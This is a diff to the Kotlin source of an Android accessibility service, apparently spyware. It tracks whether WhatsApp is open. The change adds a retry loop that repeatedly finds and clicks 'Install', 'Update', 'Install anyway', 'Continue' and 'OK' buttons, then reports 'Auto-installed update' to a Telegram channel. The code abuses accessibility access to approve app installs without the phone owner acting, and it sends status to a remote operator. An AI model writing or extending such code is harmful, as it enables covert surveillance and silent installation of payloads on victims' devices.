@@ -170,24 +170,48 @@ if (isWhatsApp && currentApp != "whatsapp") {
         } catch (_: Exception) { pkg }
     }
 
-    // ===== Auto-tap Install Button =====
-    private fun autoTapInstall() {
-        try {
-            val root = rootInActiveWindow ?: return
-            val installBtn = findButtonByText(root, listOf(
-                "Install", "INSTALL", "Update", "UPDATE",
-                "Install app", "Install anyway"
-            ))
+    // ===== Auto-tap Install Button (with retry) =====
+private fun autoTapInstall() {
+    tryAutoTapInstall(0)
+}
 
-            if (installBtn != null) {
-                Log.d(TAG, "Auto-tapping Install button")
-                installBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                notifyTelegram("✅ Auto-installed update")
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "Auto-tap error", e)
-        }
+private fun tryAutoTapInstall(attempt: Int) {
+    if (attempt >= 10) {
+        Log.d(TAG, "Auto-tap: gave up after 10 attempts")
+        return
     }
+
+    try {
+        val root = rootInActiveWindow ?: run {
+            retryAutoTap(attempt)
+            return
+        }
+
+        val installBtn = findButtonByText(root, listOf(
+            "Install", "INSTALL", "Update", "UPDATE",
+            "Install app", "Install anyway", "Update app",
+            "Continue", "CONTINUE", "OK", "Ok"
+        ))
+
+        if (installBtn != null) {
+            Log.d(TAG, "Auto-tapping Install button (attempt ${attempt + 1})")
+            installBtn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+            notifyTelegram("✅ Auto-installed update")
+        } else {
+            Log.d(TAG, "Button not found, attempt ${attempt + 1}")
+            retryAutoTap(attempt)
+        }
+    } catch (e: Exception) {
+        Log.e(TAG, "Auto-tap error", e)
+        retryAutoTap(attempt)
+    }
+}
+
+private fun retryAutoTap(attempt: Int) {
+    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+        tryAutoTapInstall(attempt + 1)
+    }, 1000L) // 1 තත්පරයක් ඉඳලා ආයෙ try කරනවා
+}
 
     private fun findButtonByText(node: AccessibilityNodeInfo?, texts: List<String>): AccessibilityNodeInfo? {
         node ?: return null
